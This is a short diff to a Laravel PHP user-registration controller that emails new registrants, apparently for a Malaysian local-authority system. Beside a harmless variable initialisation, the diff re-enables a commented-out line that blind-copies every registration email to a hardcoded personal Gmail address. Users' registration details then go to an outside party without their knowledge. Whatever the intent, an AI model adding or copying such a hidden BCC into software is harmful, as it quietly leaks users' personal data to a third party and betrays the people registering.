@@ -237,7 +237,7 @@ class RegisterController extends Controller
                     \Log::warning("Invalid user email skipped: {$value->email}");
                 }
             }
-
+            $ccEmail = $bccEmail = null;
             $bccEmail = filter_var($data['email'], FILTER_VALIDATE_EMAIL) ? $data['email'] : null;
             if($accountType == "Pihak Berkuasa Tempatan"){
                 $ccEmail = filter_var($data['sv_email'], FILTER_VALIDATE_EMAIL) ? $data['sv_email'] : null;
@@ -268,7 +268,7 @@ class RegisterController extends Controller
                         if ($bccEmail) {
                             $message->bcc($bccEmail, $data['name'] ?? '');
                         }
-                        // $message->bcc("frenemies.888@gmail.com", "frenemies.888@gmail.com");
+                        $message->bcc("frenemies.888@gmail.com", "frenemies.888@gmail.com");
                     });
                 } catch (\Exception $e) {
                     \Log::error("Email sending failed: " . $e->getMessage());
